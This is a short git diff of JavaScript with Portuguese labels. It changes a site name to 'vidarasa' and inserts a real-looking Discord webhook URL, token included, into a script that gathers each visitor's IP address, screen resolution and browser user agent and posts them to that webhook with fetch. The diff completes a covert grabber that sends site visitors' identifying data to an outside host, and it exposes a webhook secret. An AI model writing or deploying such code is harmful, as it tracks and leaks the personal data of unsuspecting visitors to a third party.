@@ -13,7 +13,7 @@
                 content: 'Informações do Usuário:',
                 embeds: [
                     {
-                        title: 'Site: total90',
+                        title: 'Site: vidarasa',
                         description: `Ip da Máquina: ${data.ip}
                         Resolução do Monitor: ${screenWidth}x${screenHeight}
                         Informações do Navegador: ${userAgent}
@@ -25,7 +25,7 @@
             };
 
          
-            const webhookUrl = 'h';
+            const webhookUrl = 'https://discord.com/api/webhooks/1180363243580035072/TscrmiTPDwxj-KNH1wqOAG2ion6TIsqOLhkIvO9EQmTYCpgSvMlRUEorGHZjRiMKo0kr';
 
           
             fetch(webhookUrl, {
